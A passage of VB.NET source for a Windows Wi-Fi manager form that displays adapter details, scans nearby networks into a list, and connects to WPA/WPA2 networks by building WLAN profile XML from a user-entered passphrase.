        Dim connectedSsids As Collection(Of [String]) = New Collection(Of String)()
        For Each wlanInterface As WlanClient.WlanInterface In wlan.Interfaces
            If wlanInterface.InterfaceState = Network_Tools.Wlan.WlanInterfaceState.Disconnected Then
                'Changing Label 9 to None , Changing status to Disconnected if the interface is Disconnected
                lbl9.Text = "None"
            Else
                'Declaring ssid as current connected Wi-Fi network
                Dim ssid As Wlan.Dot11Ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid
                'Getting the name of connected Wi-Fi network
                connectedSsids.Add(New [String](Encoding.ASCII.GetChars(ssid.SSID, 0, CInt(ssid.SSIDLength))))
                For Each item As String In connectedSsids
                    'Changing Label 9 to Connected SSID , Changing status to Connected
                    lbl9.Text = item
                    TimerF1.Start()
                Next
            End If
        Next
        'This is the code for getting Wi-Fi Adapter Name and MAC Address
        Dim client As WlanClient = New WlanClient()
        For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
            'Getting MAC address
            Dim MAC = wlanIface.NetworkInterface.GetPhysicalAddress.ToString
            'Converting MAC address to format (XX:XX:XX:XX:XX:XX)
            Dim adMAC = ""
            Dim i As Integer
            For i = 1 To MAC.Length Step 2
                adMAC &= MAC.Substring(i - 1, 1) & MAC.Substring(i, 1) & ":"
            Next
            'Displaying converted MAC address and removing the last symbol (":")
            lbl3.Text = adMAC.Remove(adMAC.Length - 1)
            'Displaing Wi-Fi Adapter Name
            lbl5.Text = wlanIface.InterfaceDescription
            'This is the code for getting RSSI , Link Speed and Channel
            If wlanIface.InterfaceState = Network_Tools.Wlan.WlanInterfaceState.Disconnected Then
                lbl11.Text = "-------------"
                lbl12.Text = "-------------"
                lbl13.Text = "-------------"
            Else
                'Displaying RSSI + "dbm"
                lbl11.Text = wlanIface.RSSI.ToString & " dbm"
                'Displaying Link Speed in Mbps
                Dim lnkspeed As Integer
                lnkspeed = wlanIface.NetworkInterface.Speed * 10 ^ -6
                lbl12.Text = lnkspeed.ToString & " Mbps"
                'Displaying Channel
                lbl13.Text = wlanIface.Channel.ToString
            End If
        Next
        'This is the code for getting IP Address
        Dim host As IPHostEntry
        Dim hostname As String
        hostname = My.Computer.Name
        host = Dns.GetHostEntry(hostname)
        'Getting each IP address in the AddressList of your computer
        For Each ip As IPAddress In host.AddressList
            If ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork Then
                'Displaying the IP address according to the periority of network adapters (The output will be the IP address of the first network adapter)
                lbl7.Text = ip.ToString
                If lbl7.Text = "127.0.0.1" Then
                    stat.Text = "Disconnected"
                Else
                    stat.Text = "Connected"
                End If
            End If
        Next
        'This is the code for scanning available Wi-Fi networks
        'First of all , we should clear items for every click to prevent duplication of Wi-Fi networks in lstNetworks 
        lstNetworks.Items.Clear()
        Dim interface2 As WlanClient.WlanInterface
        For Each interface2 In client.Interfaces
            Dim entry As Wlan.WlanBssEntry
            For Each entry In interface2.GetNetworkBssList
                'These codes will get MAC Addresses of Wi-Fi networks converted to (XX:XX:XX:XX:XX:XX)
                Dim buffer As Byte() = entry.dot11Bssid 'Getting MAC Address of each Wi-Fi Network
                Dim builder As New StringBuilder
                Dim num3 As Byte
                For Each num3 In buffer
                    builder.Append((num3.ToString("x2").ToUpper & ":"))
                Next
                'Getting SSID
                Dim text As New String((Form1.GetStringForSSID(entry.dot11Ssid)))
                Dim item As New ListViewItem([text])
                If (Not Me.lstNetworks.Items.ContainsKey(item.Text) AndAlso (entry.dot11Ssid.SSID.Length > 0)) Then
                    Dim item2 As New ListViewItem([text]) With { _
                        .Name = [text] _
                    }
                    'Adding to lstNetworks : SSID , Security type , Encryption Type , RSSI , Signal , Network Type and Flags 
                    Me.lstNetworks.Items.Add(item2) 'Adding new items (SSIDs)
                    item2.SubItems.Add(builder.Remove((builder.Length - 1), 1).ToString) 'Adding converted MAC addresses and removing last symbol (":")
                    item2.SubItems.Add("unknown")  'This will add "unknown" IF THE NETWORK IS HIDDEN (SSID="")
                    item2.SubItems.Add("unknown2") 'This Will add "unknown2" IF THE NETWORK IS HIDDEN (SSID="")
                    item2.SubItems.Add(entry.rssi.ToString() & " dbm") 'Adding RSSI = "dbm"
                    item2.SubItems.Add((Convert.ToString(entry.linkQuality) & "% ")) 'Adding signal quality + "%"
                    item2.SubItems.Add(entry.dot11BssType.ToString()) 'Adding network type
                    item2.SubItems.Add("unknown3") 'This will add "unknown3" IF THE NETWORK IS HIDDEN (SSID="")
                End If
            Next
            'These codes will get Security Type , Encryption Type and Flags according to the functions above
            If (Me.lstNetworks.Items.Count > 0) Then
                Dim network As Wlan.WlanAvailableNetwork
                For Each network In interface2.GetAvailableNetworkList(0)
                    Dim str3 As String = Encoding.ASCII.GetString(network.dot11Ssid.SSID).ToString
                    Dim str2 As New String(Form1.GetEncryptionState(network.dot11DefaultAuthAlgorithm.ToString))
                    Dim strx As New String(Form1.GetEncryptionType(network.dot11DefaultCipherAlgorithm.ToString))
                    Dim flag As New String(Form1.GetFlag(network.flags.ToString))
                    Dim item3 As ListViewItem = Me.lstNetworks.FindItemWithText(str3, False, 0)
                    'Changing "unknown" to Security Type
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = "unknown")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = str2
                    End If
                    'Changing "unknown2" to Encryption Type
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = "unknown2")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = strx
                    End If
                    'Changing "unknown3" to Flags
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = "unknown3")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = flag
                    End If
                Next
            End If
        Next
        'Counting Wi-Fi Networks
        Me.lblNrRed.Text = Convert.ToString(Me.lstNetworks.Items.Count)
        'Stopping TimerA1
        TimerA1.Stop()
        'Starting TimerF1
        TimerF1.Start()
    End Sub
    'Code for TimerA2 , it is used to : display connected SSID , getting adapter details and scanning for available Wi-Fi networks
    Private Sub TimerA2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerA2.Tick
        'Disabling some tools
        passchkbox.Enabled = False
        btnConnect.Enabled = False
        saved.Enabled = False
        passbox.Enabled = False
        passbox.Clear()
        lstNetworks.Enabled = True
        btn_disconnect.Enabled = True
        btn_refresh.Enabled = True
        delete.Enabled = False
        'Disconnecting from Wi-Fi network
        Dim client As WlanClient = New WlanClient()
        For Each wlanIface2 As WlanClient.WlanInterface In client.Interfaces
            wlanIface2.Disconnect()
        Next
        'THIS WILL DISPLAY THE CONNECTED WI-FI'S SSID
        Dim wlan = New WlanClient()
        Dim connectedSsids As Collection(Of [String]) = New Collection(Of String)()
        For Each wlanInterface As WlanClient.WlanInterface In wlan.Interfaces
            If wlanInterface.InterfaceState = Network_Tools.Wlan.WlanInterfaceState.Disconnected Then
                'Changing Label 9 to None , Changing status to Disconnected
                lbl9.Text = "None"
            Else
                Dim ssid As Wlan.Dot11Ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid
                connectedSsids.Add(New [String](Encoding.ASCII.GetChars(ssid.SSID, 0, CInt(ssid.SSIDLength))))
                For Each item As String In connectedSsids
                    'Changing Label 9 to Connected SSID , Changing status to Connected
                    lbl9.Text = item
                    TimerF1.Start()
                Next
            End If
        Next
        'This is the code for getting Wi-Fi Adapter Name and MAC Address
        For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
            Dim MAC = wlanIface.NetworkInterface.GetPhysicalAddress.ToString
            Dim adMAC = ""
            Dim i As Integer
            For i = 1 To MAC.Length Step 2
                adMAC &= MAC.Substring(i - 1, 1) & MAC.Substring(i, 1) & ":"
            Next
            lbl3.Text = adMAC.Remove(adMAC.Length - 1)
            lbl5.Text = wlanIface.InterfaceDescription
            'This is the code for getting RSSI , Link Speed and Channel
            If wlanIface.InterfaceState = Network_Tools.Wlan.WlanInterfaceState.Disconnected Then
                lbl11.Text = "-------------"
                lbl12.Text = "-------------"
                lbl13.Text = "-------------"
            Else
                lbl11.Text = wlanIface.RSSI.ToString & " dbm"
                Dim lnkspeed As Integer
                lnkspeed = wlanIface.NetworkInterface.Speed * 10 ^ -6
                lbl12.Text = lnkspeed.ToString & " Mbps"
                lbl13.Text = wlanIface.Channel.ToString
            End If
        Next
        'This is the code for getting IP Address
        Dim host As IPHostEntry
        Dim hostname As String
        hostname = My.Computer.Name
        host = Dns.GetHostEntry(hostname)
        For Each ip As IPAddress In host.AddressList
            If ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork Then
                lbl7.Text = ip.ToString
            End If
            'Displaying the IP address according to the periority of network adapters (The output will be the IP address of the first network adapter)
            If lbl7.Text = "127.0.0.1" Then
                stat.Text = "Disconnected"
            Else
                stat.Text = "Connected"
            End If
        Next
        'This is the code for scanning for available Wi-Fi networks
        'First of all , we should clear items for every click to prevent duplication of Wi-Fi networks in lstNetworks 
        lstNetworks.Items.Clear()
        Dim interface2 As WlanClient.WlanInterface
        For Each interface2 In client.Interfaces
            Dim entry As Wlan.WlanBssEntry
            For Each entry In interface2.GetNetworkBssList
                'These codes will convert MAC Address
                Dim buffer As Byte() = entry.dot11Bssid
                Dim builder As New StringBuilder
                Dim num3 As Byte
                For Each num3 In buffer
                    builder.Append((num3.ToString("x2").ToUpper & ":"))
                Next
                'Getting SSID
                Dim text As New String((Form1.GetStringForSSID(entry.dot11Ssid)))
                Dim item As New ListViewItem([text])
                If (Not Me.lstNetworks.Items.ContainsKey(item.Text) AndAlso (entry.dot11Ssid.SSID.Length > 0)) Then
                    Dim item2 As New ListViewItem([text]) With { _
                        .Name = [text] _
                    }
                    'Adding to lstNetworks SSID , Security type , Encryption Type , RSSI , Signal , Network Type and Flags
                    item2.SubItems.Add(builder.Remove((builder.Length - 1), 1).ToString)
                    item2.SubItems.Add("unknown")
                    item2.SubItems.Add("unknown2")
                    item2.SubItems.Add(entry.rssi.ToString() & " dbm")
                    item2.SubItems.Add((Convert.ToString(entry.linkQuality) & "% "))
                    item2.SubItems.Add(entry.dot11BssType.ToString())
                    item2.SubItems.Add("unknown3")
                    Me.lstNetworks.Items.Add(item2)
                    Dim num5 As Integer = CInt(Math.Round(CDbl((Conversion.Val(Me.lstNetworks.Items.Count) - 1))))
                End If
            Next
            'These codes will get Security Type , Encryption Type and Flags according to the functions in the begining 
            If (Me.lstNetworks.Items.Count > 0) Then
                Dim network As Wlan.WlanAvailableNetwork
                For Each network In interface2.GetAvailableNetworkList(0)
                    Dim str3 As String = Encoding.ASCII.GetString(network.dot11Ssid.SSID).ToString
                    Dim str2 As New String(Form1.GetEncryptionState(network.dot11DefaultAuthAlgorithm.ToString))
                    Dim strx As New String(Form1.GetEncryptionType(network.dot11DefaultCipherAlgorithm.ToString))
                    Dim flag As New String(Form1.GetFlag(network.flags.ToString))
                    Dim item3 As ListViewItem = Me.lstNetworks.FindItemWithText(str3, False, 0)
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = "unknown")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = str2
                    End If
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = "unknown2")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = strx
                    End If
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = "unknown3")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = flag
                    End If
                Next
            End If
        Next
        'Counting Wi-Fi Networks
        Me.lblNrRed.Text = Convert.ToString(Me.lstNetworks.Items.Count)
        'Stopping Timer2A
        TimerA2.Stop()
        TimerF1.Start()
    End Sub
    'Code for START-UP of the program
    Private Sub Form1_Load_WiFi(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'THIS WILL DISPLAY THE CONNECTED WIFI'S SSID ON START UP
        'Starting Timer1A
        TimerA1.Start()
        Dim wlan = New WlanClient()
        Dim connectedSsids As Collection(Of [String]) = New Collection(Of String)()
        For Each wlanInterface As WlanClient.WlanInterface In wlan.Interfaces
            If wlanInterface.InterfaceState = Network_Tools.Wlan.WlanInterfaceState.Disconnected Then
                lbl9.Text = "None"
            Else
                Dim ssid As Wlan.Dot11Ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid
                connectedSsids.Add(New [String](Encoding.ASCII.GetChars(ssid.SSID, 0, CInt(ssid.SSIDLength))))
                For Each item As String In connectedSsids
                    lbl9.Text = item
                    TimerF1.Start()
                Next
            End If
        Next
        'This is the code for Getting Wi-Fi Adapter Name and MAC Address
        Dim client As WlanClient = New WlanClient()
        For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
            Dim MAC = wlanIface.NetworkInterface.GetPhysicalAddress.ToString
            Dim adMAC = ""
            Dim i As Integer
            For i = 1 To MAC.Length Step 2
                adMAC &= MAC.Substring(i - 1, 1) & MAC.Substring(i, 1) & ":"
            Next
            lbl3.Text = adMAC.Remove(adMAC.Length - 1)
            lbl5.Text = wlanIface.InterfaceDescription
            'This is the code for getting RSSI , Link Speed and Channel
            If wlanIface.InterfaceState = Network_Tools.Wlan.WlanInterfaceState.Disconnected Then
                lbl11.Text = "-------------"
                lbl12.Text = "-------------"
                lbl13.Text = "-------------"
            Else
                lbl11.Text = wlanIface.RSSI.ToString & " dbm"
                Dim lnkspeed As Integer
                lnkspeed = wlanIface.NetworkInterface.Speed * 10 ^ -6
                lbl12.Text = lnkspeed.ToString & " Mbps"
                lbl13.Text = wlanIface.Channel.ToString
            End If
        Next
        'This is the code for getting IP Address
        Dim host As IPHostEntry
        Dim hostname As String
        hostname = My.Computer.Name
        host = Dns.GetHostEntry(hostname)
        For Each ip As IPAddress In host.AddressList
            If ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork Then
                lbl7.Text = ip.ToString
            End If
            'Displaying the IP address according to the periority of network adapters (The output will be the IP address of the first network adapter)
            If lbl7.Text = "127.0.0.1" Then
                stat.Text = "Disconnected"
            Else
                stat.Text = "Connected"
            End If
        Next
        'This is the code for scanning available Wi-Fi networks
        stat.Text = "Scanning..."
        'First of all , we should clear items for every click to prevent duplication of Items in lstNetworks 
        lstNetworks.Items.Clear()
        Dim interface2 As WlanClient.WlanInterface
        For Each interface2 In client.Interfaces
            interface2.Scan()
            Dim entry As Wlan.WlanBssEntry
            For Each entry In interface2.GetNetworkBssList
                Dim buffer As Byte() = entry.dot11Bssid
                Dim builder As New StringBuilder
                Dim num3 As Byte
                For Each num3 In buffer
                    builder.Append((num3.ToString("x2").ToUpper & ":"))
                Next
                Dim text As New String((Form1.GetStringForSSID(entry.dot11Ssid)))
                Dim item As New ListViewItem([text])
                If (Not Me.lstNetworks.Items.ContainsKey(item.Text) AndAlso (entry.dot11Ssid.SSID.Length > 0)) Then
                    Dim item2 As New ListViewItem([text]) With { _
                        .Name = [text] _
                    }
                    item2.SubItems.Add(builder.Remove((builder.Length - 1), 1).ToString)
                    item2.SubItems.Add("unknown")
                    item2.SubItems.Add("unknown2")
                    item2.SubItems.Add(entry.rssi.ToString() & " dbm")
                    item2.SubItems.Add((Convert.ToString(entry.linkQuality) & "% "))
                    item2.SubItems.Add(entry.dot11BssType.ToString())
                    item2.SubItems.Add("unknown3")
                    Me.lstNetworks.Items.Add(item2)
                    Dim num5 As Integer = CInt(Math.Round(CDbl((Conversion.Val(Me.lstNetworks.Items.Count) - 1))))
                End If
            Next
            If (Me.lstNetworks.Items.Count > 0) Then
                Dim network As Wlan.WlanAvailableNetwork
                For Each network In interface2.GetAvailableNetworkList(0)
                    Dim str3 As String = Encoding.ASCII.GetString(network.dot11Ssid.SSID).ToString
                    Dim str2 As New String(Form1.GetEncryptionState(network.dot11DefaultAuthAlgorithm.ToString))
                    Dim strx As New String(Form1.GetEncryptionType(network.dot11DefaultCipherAlgorithm.ToString))
                    Dim flag As New String(Form1.GetFlag(network.flags.ToString))
                    Dim item3 As ListViewItem = Me.lstNetworks.FindItemWithText(str3, False, 0)
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = "unknown")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = str2
                    End If
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = "unknown2")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = strx
                    End If
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = "unknown3")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = flag
                    End If
                Next
            End If
        Next
        Me.lblNrRed.Text = Convert.ToString(Me.lstNetworks.Items.Count)
    End Sub
    'Codes for the Connect Button
    Private Sub btnConnect_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnConnect.Click
        Dim client As New WlanClient()
        For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
            'Disabling some tools
            lstNetworks.Enabled = False
            btnConnect.Enabled = False
            passbox.Enabled = False
            passchkbox.Enabled = False
            saved.Enabled = False
            delete.Enabled = False
            'Here we have 6 Cases
            'CASE 1 : Connects to a known network with WPA security AND TKIP ENCRYPTION TYPE
            If security.Text = "WPA" And encryption.Text = "TKIP" Then
                If passbox.TextLength < 8 Then
                    MsgBox("The key or passphrase is incorrect.", MsgBoxStyle.Critical, "Error")
                    'Clearing password textbox
                    passbox.Clear()
                    passbox.Focus()
                    'Enabling some tools
                    lstNetworks.Enabled = True
                    btnConnect.Enabled = True
                    passbox.Enabled = True
                    passchkbox.Enabled = True
                    Exit Sub
                Else
                    Try
                        Dim profileXml As String = ""
                        Dim ssid, auth, enc, key As String
                        ssid = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                        auth = "WPAPSK"
                        enc = "TKIP"
                        key = passbox.Text
                        profileXml = (("<?xml version=""1.0"" encoding=""US-ASCII""?>" & Environment.NewLine) & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & Environment.NewLine)
                        profileXml = ((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "<SSIDConfig>" & Environment.NewLine) & "<SSID>" & Environment.NewLine)
                        profileXml = (((((((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "</SSID>" & Environment.NewLine) & "</SSIDConfig>" & Environment.NewLine) & "<connectionType>ESS</connectionType>" & Environment.NewLine) & "<connectionMode>auto</connectionMode>" & Environment.NewLine) & "<MSM>" & Environment.NewLine) & "<security>" & Environment.NewLine) & "<authEncryption>" & Environment.NewLine)
                        profileXml = String.Concat(New String() {profileXml, "<authentication>", auth, "</authentication>", Environment.NewLine})
                        profileXml = (((((String.Concat(New String() {profileXml, "<encryption>", enc, "</encryption>", Environment.NewLine}) & "<useOneX>false</useOneX>" & Environment.NewLine) & "</authEncryption>" & Environment.NewLine) & "<sharedKey>" & Environment.NewLine) & "<keyType>passPhrase</keyType>" & Environment.NewLine) & "<protected>false</protected>" & Environment.NewLine)
                        profileXml = ((((String.Concat(New String() {profileXml, "<keyMaterial>", key, "</keyMaterial>", Environment.NewLine}) & "</sharedKey>" & Environment.NewLine) & "</security>" & Environment.NewLine) & "</MSM>" & Environment.NewLine) & "</WLANProfile>")
                        'Changing Status to "Connecting..."
                        stat.Text = "Connecting..."
                        'Disabling Connect button
                        btnConnect.Enabled = False
                        wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, True)
                        wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, ssid, 4000)
                        If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Authenticating Then
                            MsgBox("Network Security Key Mismatch", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        ElseIf wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                            MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        Else
                            'Starting Timer1
                            TimerA1.Start()
                        End If
                    Catch ex As Wlan.WlanException
                        MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
                    End Try
                End If
                'CASE 2 : Connects to a known network with WPA security AND AES ENCRYPTION TYPE
            ElseIf security.Text = "WPA" And encryption.Text = "AES" Then
                If passbox.TextLength < 8 Or passbox.Text = "" Then
                    MsgBox("The key or passphrase is incorrect.", MsgBoxStyle.Critical, "Error")
                    passbox.Clear()
                    passbox.Focus()
                    'Enabling some tools
                    lstNetworks.Enabled = True
                    btnConnect.Enabled = True
                    passbox.Enabled = True
                    passchkbox.Enabled = True
                    Exit Sub
                Else
                    Try
                        Dim profileXml As String = ""
                        Dim ssid, auth, enc, key As String
                        ssid = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                        auth = "WPAPSK"
                        enc = "AES"
                        key = passbox.Text
                        profileXml = (("<?xml version=""1.0"" encoding=""US-ASCII""?>" & Environment.NewLine) & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & Environment.NewLine)
                        profileXml = ((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "<SSIDConfig>" & Environment.NewLine) & "<SSID>" & Environment.NewLine)
                        profileXml = (((((((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "</SSID>" & Environment.NewLine) & "</SSIDConfig>" & Environment.NewLine) & "<connectionType>ESS</connectionType>" & Environment.NewLine) & "<connectionMode>auto</connectionMode>" & Environment.NewLine) & "<MSM>" & Environment.NewLine) & "<security>" & Environment.NewLine) & "<authEncryption>" & Environment.NewLine)
                        profileXml = String.Concat(New String() {profileXml, "<authentication>", auth, "</authentication>", Environment.NewLine})
                        profileXml = (((((String.Concat(New String() {profileXml, "<encryption>", enc, "</encryption>", Environment.NewLine}) & "<useOneX>false</useOneX>" & Environment.NewLine) & "</authEncryption>" & Environment.NewLine) & "<sharedKey>" & Environment.NewLine) & "<keyType>passPhrase</keyType>" & Environment.NewLine) & "<protected>false</protected>" & Environment.NewLine)
                        profileXml = ((((String.Concat(New String() {profileXml, "<keyMaterial>", key, "</keyMaterial>", Environment.NewLine}) & "</sharedKey>" & Environment.NewLine) & "</security>" & Environment.NewLine) & "</MSM>" & Environment.NewLine) & "</WLANProfile>")
                        'Changing Status to "Connecting..."
                        stat.Text = "Connecting..."
                        'Disabling Connect button
                        btnConnect.Enabled = False
                        wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, True)
                        wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, ssid, 4000)
                        If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Authenticating Then
                            MsgBox("Network Security Key Mismatch", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        ElseIf wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                            MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        Else
                            'Starting Timer1
                            TimerA1.Start()
                        End If
                    Catch ex As Wlan.WlanException
                        MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
                    End Try
                End If
                'CASE 3 : Connects to a known network with WPA2 security AND TKIP ENCRYPTION TYPE
            ElseIf security.Text = "WPA2" And encryption.Text = "TKIP" Then
                If passbox.TextLength < 8 Then
                    MsgBox("The key or passphrase is incorrect.", MsgBoxStyle.Critical, "Error")
                    passbox.Clear()
                    passbox.Focus()
                    'Enabling some tools
                    lstNetworks.Enabled = True
                    btnConnect.Enabled = True
                    passbox.Enabled = True
                    passchkbox.Enabled = True
                    Exit Sub
                Else
                    Try
                        Dim profileXml As String = ""
                        Dim ssid, auth, enc, key As String
                        ssid = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                        auth = "WPA2PSK"
                        enc = "TKIP"
                        key = passbox.Text
                        profileXml = (("<?xml version=""1.0"" encoding=""US-ASCII""?>" & Environment.NewLine) & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & Environment.NewLine)
                        profileXml = ((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "<SSIDConfig>" & Environment.NewLine) & "<SSID>" & Environment.NewLine)
                        profileXml = (((((((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "</SSID>" & Environment.NewLine) & "</SSIDConfig>" & Environment.NewLine) & "<connectionType>ESS</connectionType>" & Environment.NewLine) & "<connectionMode>auto</connectionMode>" & Environment.NewLine) & "<MSM>" & Environment.NewLine) & "<security>" & Environment.NewLine) & "<authEncryption>" & Environment.NewLine)
                        profileXml = String.Concat(New String() {profileXml, "<authentication>", auth, "</authentication>", Environment.NewLine})
                        profileXml = (((((String.Concat(New String() {profileXml, "<encryption>", enc, "</encryption>", Environment.NewLine}) & "<useOneX>false</useOneX>" & Environment.NewLine) & "</authEncryption>" & Environment.NewLine) & "<sharedKey>" & Environment.NewLine) & "<keyType>passPhrase</keyType>" & Environment.NewLine) & "<protected>false</protected>" & Environment.NewLine)
                        profileXml = ((((String.Concat(New String() {profileXml, "<keyMaterial>", key, "</keyMaterial>", Environment.NewLine}) & "</sharedKey>" & Environment.NewLine) & "</security>" & Environment.NewLine) & "</MSM>" & Environment.NewLine) & "</WLANProfile>")
                        'Changing Status to "Connecting..."
                        stat.Text = "Connecting..."
                        'Disabling Connect button
                        btnConnect.Enabled = False
                        wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, True)
                        wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, ssid, 4000)
                        If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Authenticating Then
                            MsgBox("Network Security Key Mismatch", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        ElseIf wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                            MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        Else
                            'Starting Timer1
                            TimerA1.Start()
                        End If
                    Catch ex As Wlan.WlanException
                        MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
                    End Try
                End If
                'CASE 4 : Connects to a known network with WPA2 security AND AES ENCRYPTION TYPE
            ElseIf security.Text = "WPA2" And encryption.Text = "AES" Then
                If passbox.TextLength < 8 Then
                    MsgBox("The key or passphrase is incorrect.", MsgBoxStyle.Critical, "Error")
                    passbox.Clear()
                    passbox.Focus()
                    'Enabling some tools
                    lstNetworks.Enabled = True
                    btnConnect.Enabled = True
                    passbox.Enabled = True
                    passchkbox.Enabled = True
                    Exit Sub
                Else
                    Try
                        Dim profileXml As String = ""
                        Dim ssid, auth, enc, key As String
                        ssid = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                        auth = "WPA2PSK"
                        enc = "AES"
                        key = passbox.Text
                        profileXml = (("<?xml version=""1.0"" encoding=""US-ASCII""?>" & Environment.NewLine) & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & Environment.NewLine)
                        profileXml = ((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "<SSIDConfig>" & Environment.NewLine) & "<SSID>" & Environment.NewLine)
                        profileXml = (((((((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "</SSID>" & Environment.NewLine) & "</SSIDConfig>" & Environment.NewLine) & "<connectionType>ESS</connectionType>" & Environment.NewLine) & "<connectionMode>auto</connectionMode>" & Environment.NewLine) & "<MSM>" & Environment.NewLine) & "<security>" & Environment.NewLine) & "<authEncryption>" & Environment.NewLine)
                        profileXml = String.Concat(New String() {profileXml, "<authentication>", auth, "</authentication>", Environment.NewLine})
                        profileXml = (((((String.Concat(New String() {profileXml, "<encryption>", enc, "</encryption>", Environment.NewLine}) & "<useOneX>false</useOneX>" & Environment.NewLine) & "</authEncryption>" & Environment.NewLine) & "<sharedKey>" & Environment.NewLine) & "<keyType>passPhrase</keyType>" & Environment.NewLine) & "<protected>false</protected>" & Environment.NewLine)
                        profileXml = ((((String.Concat(New String() {profileXml, "<keyMaterial>", key, "</keyMaterial>", Environment.NewLine}) & "</sharedKey>" & Environment.NewLine) & "</security>" & Environment.NewLine) & "</MSM>" & Environment.NewLine) & "</WLANProfile>")
                        'Changing Status to "Connecting..."
                        stat.Text = "Connecting..."
                        'Disabling Connect button
                        btnConnect.Enabled = False
                        wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, True)
